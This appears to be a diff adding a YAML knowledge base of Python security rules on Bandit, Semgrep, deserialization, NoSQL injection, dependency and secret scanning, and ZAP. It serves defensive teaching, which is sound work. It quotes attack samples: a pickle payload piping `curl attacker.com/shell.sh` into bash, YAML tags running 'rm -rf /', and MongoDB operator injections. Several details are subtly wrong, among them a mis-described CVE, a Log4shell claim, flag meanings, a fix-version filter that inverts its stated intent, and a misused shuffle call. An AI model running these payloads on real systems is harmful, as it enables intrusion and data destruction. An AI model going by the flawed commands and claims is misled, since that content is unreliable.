@@ -1,0 +1,711 @@
+layer: rules
+domain: security
+knowledge:
+- id: SAST-001
+  text: >
+    Configure Bandit with severity and confidence thresholds in .bandit.yaml: skip B101
+    (assert statements) and B311 (random — only if cryptographic randomness is not needed),
+    and set minimum severity to MEDIUM and minimum confidence to MEDIUM. Running Bandit with
+    defaults produces noisy output that developers learn to ignore; tuning it to your project's
+    risk profile drives actual remediation.
+  why: >
+    Teams that run Bandit with zero configuration get 30-60% false positive rates on typical
+    Django/FastAPI codebases, primarily from B101 (asserts in tests) and B105/B106 (hardcoded
+    password strings in comments or test fixtures). When developers encounter constant false
+    positives, they add `# nosec` annotations indiscriminately, defeating the entire purpose.
+    At Dropbox and Mozilla, tuned Bandit configurations reduced false positive rates from ~40%
+    to under 8%, making the security gate credible and enforced.
+  how_to_do_right: |
+    1. Create .bandit.yaml at project root:
+       skips: [B101, B311]  # B101=assert, B311=random (only if no crypto use)
+       exclude_dirs: [tests, migrations, docs]
+    2. Run: bandit -r src/ -c .bandit.yaml -ll -ii  # -ll=LOW level, -ii=MEDIUM confidence
+    3. For CI gate: bandit -r src/ -c .bandit.yaml -ll -ii --exit-zero=False
+    4. Baseline approach: bandit -r src/ -c .bandit.yaml -f json -o bandit-baseline.json
+       Then on each run: bandit -r src/ --baseline bandit-baseline.json
+    5. Never globally skip B602 (subprocess shell=True) or B506 (unsafe yaml.load)
+    6. Set severity threshold per risk tier: severity=HIGH for payment code, MEDIUM for APIs
+  severity: high
+  technologies:
+    lang: [python]
+    framework: [fastapi, django, flask]
+  domains:
+    domain: [security, devops]
+    concern: [sast, static_analysis]
+  example_good: |
+    # .bandit.yaml — tuned for a FastAPI project
+    skips:
+      - B101  # assert: used extensively in pytest, not in production paths
+      - B311  # random: not used for cryptographic purposes in this project
+    exclude_dirs:
+      - tests
+      - migrations
+      - alembic
+      - node_modules
+    # CI command: bandit -r src/ -c .bandit.yaml -ll -ii --format json --output bandit.json
+    # Block CI if exit code != 0 (any MEDIUM+ severity, MEDIUM+ confidence finding)
+  example_bad: |
+    # WRONG: Running bandit with no config — produces hundreds of noise findings
+    # bandit -r .
+    # This scans tests/, migrations/, and all vendored code.
+    # Generates B101 for every assert in pytest (hundreds of false positives).
+    # Team responds: git add '# nosec' to everything -> security is bypassed.
+  when_applies: Every Python project with a CI/CD pipeline — especially APIs, web apps, and data pipelines handling user input.
+  sources:
+    - "Bandit documentation — Configuration: https://bandit.readthedocs.io/en/latest/config.html"
+    - "PyCQA/bandit GitHub: https://github.com/PyCQA/bandit"
+    - "OWASP Code Review Guide v2: https://owasp.org/www-project-code-review-guide/"
+
+- id: SAST-002
+  text: >
+    Write Semgrep rules with `pattern-not-inside` and `metavariable-regex` to reduce false
+    positives in custom security checks. A rule that flags all `subprocess.run()` calls without
+    `shell=False` must also exclude calls that are explicitly guarded — otherwise 100% of your
+    subprocess utility wrappers will fire.
+  why: >
+    Semgrep's power over Bandit is precision: you can express context-aware rules that Bandit
+    cannot. The Python p/bandit Semgrep ruleset catches ~85% of what Bandit finds with 30% fewer
+    false positives because Semgrep can track data flow context. Without `pattern-not-inside`,
+    every legitimate subprocess wrapper in your codebase becomes a false positive that erodes
+    trust in the SAST gate.
+  how_to_do_right: |
+    1. Install: pip install semgrep
+    2. Run community rules: semgrep --config=p/python --config=p/owasp-top-ten src/
+    3. Write custom rule structure:
+       rules:
+         - id: no-shell-true
+           patterns:
+             - pattern: subprocess.run(..., shell=True, ...)
+             - pattern-not-inside: |
+                 if $VALIDATED:
+                     subprocess.run(...)
+           message: "subprocess.run with shell=True — inject $VALIDATED check or use shell=False"
+           languages: [python]
+           severity: ERROR
+    4. Use `fix:` key for autofix: fix: subprocess.run(..., shell=False, ...)
+    5. Test rules: semgrep --test --config=rules/ tests/
+    6. For CI: semgrep ci --config=.semgrep.yml --error (exits non-zero on findings)
+  severity: high
+  technologies:
+    lang: [python]
+    framework: [fastapi, django]
+  domains:
+    domain: [security]
+    concern: [sast, injection]
+  example_good: |
+    # .semgrep/no-pickle.yml — Custom rule with autofix
+    rules:
+      - id: no-pickle-loads
+        patterns:
+          - pattern: pickle.loads($DATA)
+          - pattern-not: pickle.loads(b"...")  # hardcoded bytes are fine in tests
+        message: |
+          pickle.loads() is vulnerable to arbitrary code execution.
+          Use msgpack.unpackb() or json.loads() instead.
+          $DATA from untrusted sources is critical severity.
+        fix: msgpack.unpackb($DATA, raw=False)
+        languages: [python]
+        severity: ERROR
+        metadata:
+          cwe: CWE-502
+          owasp: A08:2021 - Software and Data Integrity Failures
+  example_bad: |
+    # WRONG: Rule with no context — fires on everything
+    rules:
+      - id: bad-subprocess
+        pattern: subprocess.run(...)
+        message: "Unsafe subprocess"
+        languages: [python]
+        severity: ERROR
+    # This fires on ALL subprocess calls — including subprocess.run(['ls', '-la'], shell=False)
+    # which is completely safe. Zero precision = ignored by developers.
+  when_applies: Projects with custom security policies beyond what community rulesets cover, or when enforcing architectural decisions (e.g., prohibiting specific libraries).
+  sources:
+    - "Semgrep rule syntax documentation: https://semgrep.dev/docs/writing-rules/rule-syntax"
+    - "Semgrep autofix documentation: https://semgrep.dev/docs/writing-rules/autofix"
+    - "Semgrep Python ruleset (p/bandit): https://semgrep.dev/p/bandit"
+
+- id: SAST-003
+  text: >
+    Block `pickle.loads()`, `pickle.load()`, `shelve.open()`, and `marshal.loads()` on any data
+    originating from network input, database fields of type TEXT/BLOB, or user-uploaded files.
+    These deserialization functions execute arbitrary Python bytecode — they are not data parsers,
+    they are code executors.
+  why: >
+    CVE-2019-20907, the PyYAML RCE, and dozens of Python deserialization RCEs share the same
+    root cause: an attacker controls bytes that get passed to a deserializer that executes code.
+    Pickle is particularly dangerous because a malicious pickle payload that runs
+    `os.system('curl attacker.com/shell.sh | bash')` is 22 bytes. The attack requires no
+    vulnerability in your business logic — only that `pickle.loads()` receives attacker-controlled
+    bytes. Real incidents: Gentoo, Netflix internal tooling (2020), multiple Jupyter notebook
+    shared environments.
+  how_to_do_right: |
+    1. Global grep/semgrep scan: identify every pickle.loads() call site
+    2. For each: trace the source of the bytes argument up the call chain
+    3. If bytes come from: DB query result, HTTP body, file upload, queue message → REPLACE
+    4. Safe replacements by use case:
+       - Structured data: json.loads() or msgpack.unpackb(data, raw=False)
+       - Complex objects: cattrs + attrs or pydantic model_validate_json()
+       - ML models: only load from trusted paths, use framework-native formats (torch.load with weights_only=True in PyTorch >= 2.0)
+    5. If legacy code requires pickle: wrap in RestrictedUnpickler with allowlist:
+       class SafeUnpickler(pickle.Unpickler):
+           SAFE_CLASSES = {('builtins', 'list'), ('builtins', 'dict')}
+           def find_class(self, module, name):
+               if (module, name) not in self.SAFE_CLASSES:
+                   raise pickle.UnpicklingError(f"Blocked: {module}.{name}")
+               return super().find_class(module, name)
+    6. Add Bandit B301/B302/B403 checks to CI gate (cannot skip these)
+  severity: critical
+  technologies:
+    lang: [python]
+    framework: [fastapi, django, celery]
+  domains:
+    domain: [security]
+    concern: [deserialization, rce, injection]
+  example_good: |
+    import msgpack
+    import json
+    from pydantic import BaseModel
+
+    class TaskPayload(BaseModel):
+        task_id: str
+        user_id: int
+        params: dict
+
+    # From Redis queue (was previously pickle-serialized)
+    def deserialize_task(raw: bytes) -> TaskPayload:
+        # msgpack: fast, safe, language-agnostic
+        data = msgpack.unpackb(raw, raw=False)
+        return TaskPayload.model_validate(data)
+
+    # For ML models — PyTorch >= 2.0 safe mode
+    import torch
+    model = torch.load('model.pt', weights_only=True)  # blocks arbitrary code
+  example_bad: |
+    import pickle
+    import redis
+
+    r = redis.Redis()
+
+    def get_task(task_id: str):
+        raw = r.get(f"task:{task_id}")
+        # CRITICAL: Redis data can be injected by anyone with Redis access
+        # A malicious pickle payload executes OS commands during loads()
+        return pickle.loads(raw)  # B301 — Bandit flags this, never suppress
+  when_applies: "Any code that deserializes data from external sources: HTTP, databases, message queues, file uploads, shared caches."
+  sources:
+    - "OWASP Deserialization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+    - "Python pickle security warning: https://docs.python.org/3/library/pickle.html"
+    - "CWE-502: Deserialization of Untrusted Data: https://cwe.mitre.org/data/definitions/502.html"
+
+- id: SAST-004
+  text: >
+    Detect and block NoSQL injection patterns in MongoDB queries: never allow user-controlled
+    dict keys in query filters. The operators `$ne`, `$gt`, `$regex`, `$where`, and `$elemMatch`
+    can be injected via JSON body parsing to bypass authentication filters and exfiltrate
+    entire collections.
+  why: >
+    MongoDB's query-by-example model means that `db.users.find({"username": user_input})`
+    becomes an authentication bypass if `user_input = {"$ne": null}` — which matches ALL
+    documents. This exact pattern was exploited in CVE-2021-22911 (Rocket.Chat) and numerous
+    undisclosed breaches. Unlike SQL injection, there is no concept of "parameterized queries"
+    in MongoDB — the defense is input validation to ensure query values are scalars, not dicts.
+  how_to_do_right: |
+    1. Never pass raw request body dicts directly to MongoDB find/findOne queries
+    2. Validate that query filter values are scalars (str, int, bool) not dicts:
+       def safe_query_value(value: Any) -> Any:
+           if isinstance(value, dict):
+               raise ValueError(f"Dict values forbidden in query filters: {value}")
+           return value
+    3. Use Pydantic models to parse all incoming query parameters — they reject unexpected types
+    4. Allowlist MongoDB operators in query builder — never pass user-supplied operators
+    5. Semgrep rule to detect: pattern `collection.find({...: $USER_INPUT, ...})` where
+       $USER_INPUT is typed as dict or Any
+    6. For aggregation pipelines: validate $match stage contents against an operator allowlist
+    7. Enable MongoDB field-level redaction for sensitive collections
+  severity: critical
+  technologies:
+    lang: [python]
+    framework: [fastapi, django]
+  domains:
+    domain: [security]
+    concern: [nosql_injection, injection, mongodb]
+  example_good: |
+    from pydantic import BaseModel, field_validator
+    from motor.motor_asyncio import AsyncIOMotorCollection
+
+    class UserLoginRequest(BaseModel):
+        username: str
+        password: str
+
+        @field_validator('username', 'password')
+        @classmethod
+        def no_dict_injection(cls, v):
+            if not isinstance(v, str):
+                raise ValueError("Query fields must be strings")
+            return v
+
+    async def authenticate(req: UserLoginRequest, users: AsyncIOMotorCollection):
+        # Pydantic guarantees username is str — dict injection blocked at model layer
+        user = await users.find_one({"username": req.username})
+        if user and verify_password(req.password, user["password_hash"]):
+            return user
+        return None
+  example_bad: |
+    from fastapi import Request
+
+    async def authenticate_bad(request: Request, db):
+        body = await request.json()
+        # INJECTION: body["username"] can be {"$ne": null} — matches ALL users
+        # body["password"] can be {"$regex": ".*"} — matches anything
+        user = await db.users.find_one({
+            "username": body["username"],  # NoSQL injection vector
+            "password": body["password"],
+        })
+        return user  # Returns first user in DB if injected
+  when_applies: Any application using MongoDB (PyMongo, Motor, MongoEngine) that accepts user-supplied values in query filters.
+  sources:
+    - "OWASP NoSQL Injection: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"
+    - "MongoDB Security Checklist: https://www.mongodb.com/docs/manual/administration/security-checklist/"
+    - "CVE-2021-22911 Rocket.Chat NoSQL injection: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22911"
+
+- id: SAST-005
+  text: >
+    Integrate `pip-audit` (not `safety` alone) for Python dependency vulnerability scanning
+    in CI, scanning against both PyPI Advisory Database and OSV.dev. Run `pip-audit` on
+    locked requirements (requirements.txt or poetry.lock) and fail the build on CRITICAL
+    or HIGH CVEs with no available fix.
+  why: >
+    The `safety` tool uses a commercial database that lags OSV.dev by days to weeks for new
+    CVEs. In the log4shell incident (Dec 2021), teams using only safety were unaware for 72h
+    while pip-audit (using OSV.dev) flagged immediately. The 2024 xz-utils supply chain attack
+    demonstrated that transitive dependencies (not direct imports) carry the majority of CVE
+    surface. pip-audit scans the full dependency graph including transitive deps; manually
+    curated requirements.txt checks only direct deps.
+  how_to_do_right: |
+    1. Install: pip install pip-audit
+    2. Scan locked deps: pip-audit -r requirements.txt --progress-spinner off
+    3. For poetry projects: pip-audit --requirement <(poetry export --without-hashes)
+    4. CI integration (GitHub Actions):
+       - name: Audit dependencies
+         run: pip-audit -r requirements.txt --format json --output pip-audit.json
+         continue-on-error: false
+    5. Block on CRITICAL/HIGH, warn on MEDIUM:
+       pip-audit -r requirements.txt --vulnerability-service osv --format json | \
+         python3 -c "
+         import json, sys
+         data = json.load(sys.stdin)
+         critical = [v for dep in data['dependencies']
+                       for v in dep.get('vulns', [])
+                       if v['fix_versions']]
+         sys.exit(1 if critical else 0)
+         "
+    6. Add Snyk integration for secrets in package tarballs (complements pip-audit)
+    7. Run weekly even without code changes — new CVEs emerge daily
+  severity: high
+  technologies:
+    lang: [python]
+    framework: [fastapi, django]
+  domains:
+    domain: [security, devops]
+    concern: [supply_chain, dependency_scanning]
+  example_good: |
+    # .github/workflows/security.yml
+    name: Security Audit
+    on: [push, pull_request, schedule]
+    jobs:
+      audit:
+        runs-on: ubuntu-latest
+        steps:
+          - uses: actions/checkout@v4
+          - uses: actions/setup-python@v5
+            with:
+              python-version: '3.12'
+          - name: Install pip-audit
+            run: pip install pip-audit
+          - name: Audit dependencies
+            run: |
+              pip-audit -r requirements.txt \
+                --vulnerability-service osv \
+                --format json \
+                --output pip-audit-results.json
+          - name: Upload results
+            uses: actions/upload-artifact@v4
+            with:
+              name: pip-audit-results
+              path: pip-audit-results.json
+  example_bad: |
+    # WRONG: Using only safety with default (commercial) database
+    # safety check -r requirements.txt
+    # Problems:
+    # 1. safety's free tier database lags OSV.dev by days/weeks
+    # 2. Does not scan transitive dependencies
+    # 3. Does not integrate with OSV.dev or GitHub Advisory Database
+    # 4. Commercial tier required for complete coverage
+
+    # ALSO WRONG: Only running on direct requirements, not locked deps
+    # pip-audit  # scans current venv, misses version pinning issues
+  when_applies: Every Python project with a requirements.txt, Pipfile.lock, or poetry.lock — especially before any deployment to production.
+  sources:
+    - "pip-audit documentation: https://github.com/pypa/pip-audit"
+    - "OSV.dev vulnerability database: https://osv.dev/"
+    - "OWASP A06:2021 — Vulnerable and Outdated Components: https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"
+
+- id: SAST-006
+  text: >
+    Use `detect-secrets` with a pre-commit hook AND a CI scan to prevent secrets from entering
+    version control. Configure a `.secrets.baseline` file to track known false positives, and
+    use `trufflehog` for historical git history scanning when onboarding a legacy codebase.
+  why: >
+    GitGuardian reported that in 2023, over 10 million secrets were found in public GitHub
+    commits — up 67% from 2022. The average time from secret commit to exploitation is 4 minutes
+    for high-value tokens (AWS keys, Stripe keys). Pre-commit hooks catch secrets before they
+    enter git history; CI scanning catches what pre-commit misses (force-push, CI-only commits).
+    Historical scanning is critical for legacy codebases: AWS found that 30% of repositories
+    with no current secrets had secrets in history older than 6 months.
+  how_to_do_right: |
+    1. Install: pip install detect-secrets
+    2. Initialize baseline: detect-secrets scan > .secrets.baseline
+    3. Configure pre-commit (.pre-commit-config.yaml):
+       repos:
+         - repo: https://github.com/Yelp/detect-secrets
+           rev: v1.4.0
+           hooks:
+             - id: detect-secrets
+               args: ['--baseline', '.secrets.baseline']
+    4. CI scan (blocks PR merge):
+       detect-secrets scan --baseline .secrets.baseline --force-use-all-plugins
+    5. Historical scan (onboarding/audit):
+       docker run --rm -v $(pwd):/repo trufflesecurity/trufflehog:latest \
+         git file:///repo --since-commit HEAD~100 --only-verified
+    6. Rotate IMMEDIATELY any secret found in history — treat as compromised regardless of age
+    7. Never add `nosecret` annotations to real secrets; only use for documented false positives
+  severity: critical
+  technologies:
+    lang: [python]
+    framework: [fastapi, django]
+  domains:
+    domain: [security, devops]
+    concern: [secrets_management, credential_leakage]
+  example_good: |
+    # .pre-commit-config.yaml
+    repos:
+      - repo: https://github.com/Yelp/detect-secrets
+        rev: v1.4.0
+        hooks:
+          - id: detect-secrets
+            args:
+              - '--baseline'
+              - '.secrets.baseline'
+              - '--exclude-files'
+              - 'tests/fixtures/.*'
+
+    # .github/workflows/security.yml — CI check
+    - name: Check for secrets
+      run: |
+        pip install detect-secrets
+        detect-secrets scan --baseline .secrets.baseline \
+          --force-use-all-plugins \
+          --exclude-files "tests/fixtures/.*"
+  example_bad: |
+    # WRONG: Relying on .gitignore to keep secrets out
+    # .gitignore
+    # .env
+    # config/secrets.yaml
+    # This does NOT protect:
+    # 1. .env files accidentally staged before .gitignore was committed
+    # 2. Secrets hardcoded in source files (not config files)
+    # 3. Secrets in test fixtures
+    # 4. Developers who use --force or -f flags with git
+    import os
+    AWS_KEY = "AKIAIOSFODNN7EXAMPLE"  # WRONG: hardcoded, detect-secrets will flag this
+    DB_PASS = "super-secret-db-pass"   # WRONG: never hardcode credentials
+  when_applies: Every project that uses git, from the first commit. Apply trufflehog retrospectively to any repository older than 6 months before enabling strict CI gates.
+  sources:
+    - "detect-secrets GitHub: https://github.com/Yelp/detect-secrets"
+    - "TruffleHog documentation: https://github.com/trufflesecurity/trufflehog"
+    - "GitGuardian State of Secrets Sprawl 2023: https://www.gitguardian.com/state-of-secrets-sprawl"
+
+- id: SAST-007
+  text: >
+    Configure SAST security gates in CI to differentiate between blocking checks (fail the
+    build) and advisory checks (report only). Critical and High findings with >80% confidence
+    block merges; Medium findings generate PR comments; Low findings are logged for weekly
+    review. Never gate all findings equally — that drives developers to suppress all alerts.
+  why: >
+    Netflix and Google's internal SAST programs both documented the same failure pattern:
+    when SAST gates are all-or-nothing, teams respond by adding blanket suppression annotations
+    (`# nosec`, `# noqa`) or disabling SAST entirely. A tiered approach reduces developer
+    friction by 60% while maintaining coverage on the vulnerabilities that actually matter.
+    The key insight: a Low-severity style issue should never block a security fix deployment.
+  how_to_do_right: |
+    1. Define tier mapping in CI config:
+       CRITICAL + HIGH (confidence >= HIGH) → block merge
+       MEDIUM (confidence >= MEDIUM) → create PR comment, no block
+       LOW → aggregate in weekly security report
+    2. GitHub Actions example:
+       - name: Bandit SAST Gate
+         run: |
+           bandit -r src/ -c .bandit.yaml -ll -ii \
+             --format json --output bandit.json
+           python scripts/check_bandit_gate.py bandit.json
+    3. Gate script logic:
+       blocking = [f for f in findings
+                   if f['issue_severity'] in ('HIGH', 'CRITICAL')
+                   and f['issue_confidence'] in ('HIGH', 'MEDIUM')]
+       sys.exit(1 if blocking else 0)
+    4. Always post full results as PR artifact even when gate passes
+    5. Track false positive rate metric: (suppressed findings / total findings) per week
+    6. Review gate configuration monthly — tune based on actual false positive rate
+  severity: high
+  technologies:
+    lang: [python]
+    framework: [fastapi, django]
+  domains:
+    domain: [security, devops]
+    concern: [ci_cd, sast, gate_automation]
+  example_good: |
+    # scripts/check_bandit_gate.py
+    import json
+    import sys
+
+    def check_bandit_gate(results_file: str) -> int:
+        with open(results_file) as f:
+            data = json.load(f)
+
+        blocking_severities = {'HIGH', 'CRITICAL'}
+        blocking_confidences = {'HIGH', 'MEDIUM'}
+        blocking = []
+
+        for result in data.get('results', []):
+            if (result['issue_severity'] in blocking_severities and
+                    result['issue_confidence'] in blocking_confidences):
+                blocking.append(result)
+
+        if blocking:
+            print(f"BLOCKED: {len(blocking)} critical/high findings:")
+            for f in blocking:
+                print(f"  [{f['issue_severity']}] {f['test_id']}: {f['filename']}:{f['line_number']}")
+            return 1
+        print(f"PASSED: No blocking findings (total: {len(data.get('results', []))})")
+        return 0
+
+    if __name__ == '__main__':
+        sys.exit(check_bandit_gate(sys.argv[1]))
+  example_bad: |
+    # WRONG: All-or-nothing gate — blocks on ANY bandit finding
+    # bandit -r src/ && echo "pass" || exit 1
+    # Result: 1st LOW finding blocks a hotfix deployment.
+    # Developer adds # nosec everywhere to get past the gate.
+    # Security coverage drops to zero within 2 weeks.
+  when_applies: All CI/CD pipelines running SAST. Especially important for organizations with multiple teams or where developers are not security specialists.
+  sources:
+    - "OWASP DevSecOps Guideline: https://owasp.org/www-project-devsecops-guideline/"
+    - "Bandit exit codes: https://bandit.readthedocs.io/en/latest/man/bandit.html"
+    - "NIST Secure Software Development Framework (SSDF): https://csrc.nist.gov/Projects/ssdf"
+
+- id: SAST-008
+  text: >
+    Always validate YAML loading by using `yaml.safe_load()` instead of `yaml.load()`. When
+    processing YAML from external sources (file uploads, API inputs, config from DB), add a
+    size limit and schema validation layer. The `yaml.load()` function with the default Loader
+    executes arbitrary Python code embedded in YAML.
+  why: >
+    CVE-2017-18342 (PyYAML RCE) is one of the most frequently exploited Python vulnerabilities
+    in CI/CD systems because YAML config files are ubiquitous. A payload like
+    `!!python/object/apply:os.system ['rm -rf /']` in a YAML file executes during `yaml.load()`.
+    Ansible, Salt, and multiple CI platforms were vulnerable. Bandit rule B506 flags
+    `yaml.load()` — it should NEVER be suppressed. In 2024, multiple supply chain attacks
+    embedded malicious YAML in package metadata that was processed with unsafe loaders.
+  how_to_do_right: |
+    1. Global replacement: yaml.load(f) → yaml.safe_load(f) everywhere
+    2. Add Semgrep/Bandit rule to block yaml.load() (B506 in Bandit, never skip)
+    3. For complex objects that require full YAML: use a schema validator after safe_load:
+       import yaml
+       import jsonschema
+
+       def load_config(path: str, schema: dict) -> dict:
+           with open(path) as f:
+               data = yaml.safe_load(f)
+           jsonschema.validate(data, schema)  # validate structure
+           return data
+    4. For user-uploaded YAML: add size limit (max 1MB) before parsing
+    5. If you need custom tags: implement a custom SafeLoader subclass, never use FullLoader
+    6. In CI pipelines that process external YAML (GitHub Actions, etc.): run in sandbox
+  severity: critical
+  technologies:
+    lang: [python]
+    framework: [fastapi, django, ansible]
+  domains:
+    domain: [security]
+    concern: [deserialization, rce, injection]
+  example_good: |
+    import yaml
+    from pathlib import Path
+
+    MAX_YAML_SIZE = 1 * 1024 * 1024  # 1MB limit
+
+    def load_user_config(yaml_bytes: bytes) -> dict:
+        if len(yaml_bytes) > MAX_YAML_SIZE:
+            raise ValueError(f"YAML file too large: {len(yaml_bytes)} bytes (max {MAX_YAML_SIZE})")
+        # safe_load: only loads basic Python objects (dict, list, str, int, etc.)
+        # Never executes code tags like !!python/object
+        data = yaml.safe_load(yaml_bytes)
+        if not isinstance(data, dict):
+            raise ValueError("Config must be a YAML mapping (dict)")
+        return data
+  example_bad: |
+    import yaml
+
+    def load_config_bad(path: str) -> dict:
+        with open(path) as f:
+            # B506: yaml.load() with default Loader executes arbitrary Python
+            return yaml.load(f)  # type: ignore  # NEVER add nosec here
+            # An attacker-controlled YAML file can run: !!python/object/apply:os.system [id]
+  when_applies: Any code that parses YAML from files, databases, API inputs, environment variables, or any source not fully controlled by the application itself.
+  sources:
+    - "CVE-2017-18342 PyYAML: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18342"
+    - "Bandit B506 rule: https://bandit.readthedocs.io/en/latest/plugins/b506_yaml_load.html"
+    - "PyYAML safe_load docs: https://pyyaml.org/wiki/PyYAMLDocumentation"
+
+- id: SAST-009
+  text: >
+    Integrate OWASP ZAP as a DAST (dynamic analysis) complement to SAST in your CI pipeline
+    using the ZAP Automation Framework. Run a baseline scan on every PR deployment to staging
+    and a full active scan weekly. SAST and DAST together catch different vulnerability classes:
+    SAST finds injection patterns in code; DAST confirms exploitability in running systems.
+  why: >
+    SAST tools cannot detect: authentication bypass via session fixation, IDOR through properly
+    implemented code that has incorrect authorization logic, CORS misconfiguration, or
+    security headers missing from the actual HTTP response. DAST catches these by exercising
+    the running application. ZAP baseline scans take 5-10 minutes and catch the most common
+    issues; they complement (not replace) SAST. The OWASP ZAP team documented that combining
+    SAST + DAST reduces false negatives by 45% compared to either tool alone.
+  how_to_do_right: |
+    1. ZAP baseline scan (passive, safe for PR pipelines):
+       docker run --network=host zaproxy/zap-stable zap-baseline.py \
+         -t http://staging.yourapp.com \
+         -J zap-baseline-report.json \
+         -I  # do not fail on warnings, only on errors
+    2. Add to GitHub Actions after deploy-to-staging step:
+       - name: ZAP Baseline Scan
+         uses: zaproxy/action-baseline@v0.12.0
+         with:
+           target: 'https://staging.yourapp.com'
+           fail_action: true
+           issue_title: 'ZAP Baseline Report'
+    3. Configure zap_ignore.tsv to suppress known false positives per environment
+    4. Full active scan (weekly, not in PR pipeline — mutates state):
+       zap-full-scan.py -t http://staging.yourapp.com -J zap-full-report.json
+    5. Track findings trend over time — new findings in ZAP baseline = regression
+    6. Set FAIL_ON_WARN: false for baseline (too noisy), FAIL_ON_WARN: true for full scan
+  severity: high
+  technologies:
+    lang: [python]
+    framework: [fastapi, django]
+  domains:
+    domain: [security, devops]
+    concern: [dast, api_security, owasp]
+  example_good: |
+    # .github/workflows/dast.yml
+    name: DAST Security Scan
+    on:
+      push:
+        branches: [main, staging]
+    jobs:
+      zap-scan:
+        runs-on: ubuntu-latest
+        steps:
+          - name: Deploy to staging
+            run: ./scripts/deploy-staging.sh
+
+          - name: ZAP Baseline Scan
+            uses: zaproxy/action-baseline@v0.12.0
+            with:
+              target: 'https://staging.example.com/api'
+              rules_file_name: '.zap/rules.tsv'
+              cmd_options: '-a'  # include ajax spider
+            env:
+              ZAP_AUTH_HEADER: ${{ secrets.STAGING_API_KEY }}
+
+          - name: Upload ZAP Report
+            uses: actions/upload-artifact@v4
+            if: always()
+            with:
+              name: zap-report
+              path: report_html.html
+  example_bad: |
+    # WRONG: Running ZAP active scan in CI on production
+    # zap-full-scan.py -t https://api.production.com
+    # Active scan sends malformed requests that can:
+    # 1. Corrupt production database records
+    # 2. Trigger rate limiting for real users
+    # 3. Cause cascading failures in integrated services
+    # ALWAYS use DAST only against dedicated staging environments
+  when_applies: Web applications and REST APIs deployed to staging environments. Run baseline passively on every PR, full active scan weekly or before major releases.
+  sources:
+    - "OWASP ZAP Automation Framework: https://www.zaproxy.org/docs/automate/automation-framework/"
+    - "ZAP GitHub Actions: https://github.com/zaproxy/action-baseline"
+    - "OWASP Testing Guide v4.2: https://owasp.org/www-project-web-security-testing-guide/"
+
+- id: SAST-010
+  text: >
+    Manage SAST false positives systematically with per-finding `# nosec BXXX` annotations
+    that require a comment explaining WHY it is a false positive, enforced via a linting rule.
+    An uncommented `# nosec` should fail CI — it is indistinguishable from suppression of
+    a real vulnerability.
+  why: >
+    At scale (10k+ LOC), any SAST tool generates false positives. The failure mode is not the
+    false positives themselves — it is that developers suppress them without documentation,
+    creating a codebase where `# nosec` annotations are mixed between legitimate suppressions
+    and concealed vulnerabilities. GitHub's security team found that in audited open-source
+    repos, 23% of `# nosec` annotations were suppressing real vulnerabilities that the developer
+    had incorrectly classified as false positives.
+  how_to_do_right: |
+    1. Policy: all # nosec annotations MUST include the specific rule ID and justification:
+       # nosec B311 — cryptography.secrets not needed; this is UI element ordering, not security
+    2. Enforce with a Semgrep rule:
+       rules:
+         - id: nosec-requires-justification
+           pattern-regex: "# nosec(?! B[0-9]+)"
+           message: "# nosec must specify rule ID: # nosec BXXX — reason"
+           languages: [python]
+           severity: ERROR
+    3. Quarterly audit: review all # nosec annotations, verify each is still accurate
+    4. Use Bandit's --baseline feature for false positive management at scale instead of
+       per-line annotations — creates a JSON baseline file that tracks suppressions centrally
+    5. Track suppression count as a metric: if it grows >5% per sprint, investigate
+    6. Any suppression of B301/B302 (pickle), B506 (yaml), B602 (shell) requires security
+       team review — these are almost never false positives
+  severity: medium
+  technologies:
+    lang: [python]
+    framework: [fastapi, django]
+  domains:
+    domain: [security, devops]
+    concern: [sast, false_positives, governance]
+  example_good: |
+    import random
+    import secrets
+
+    # GOOD: documented nosec with specific rule and justification
+    shuffle_order = random.shuffle(display_items)  # nosec B311 — display ordering only, not cryptographic
+
+    # BETTER: fix the code instead of suppressing
+    shuffle_order = list(range(len(display_items)))
+    secrets.SystemRandom().shuffle(shuffle_order)  # Use secrets.SystemRandom() — no nosec needed
+  example_bad: |
+    import subprocess
+    import yaml
+
+    # WRONG: undocumented nosec — could be hiding a real vulnerability
+    result = subprocess.run(cmd, shell=True)  # nosec
+    config = yaml.load(f)  # nosec
+
+    # These may be real vulnerabilities; there is no way to know without justification.
+    # The CI should reject: bandit will pass, but the nosec-requires-justification rule will fail.
+  when_applies: All Python projects using Bandit or Semgrep where developers add nosec/noqa annotations. Enforce from day one to prevent suppression debt accumulation.
+  sources:
+    - "Bandit nosec documentation: https://bandit.readthedocs.io/en/latest/config.html#suppressing-individual-lines"
+    - "Bandit baseline feature: https://bandit.readthedocs.io/en/latest/man/bandit.html"
+    - "OWASP Application Security Verification Standard (ASVS): https://owasp.org/www-project-application-security-verification-standard/"
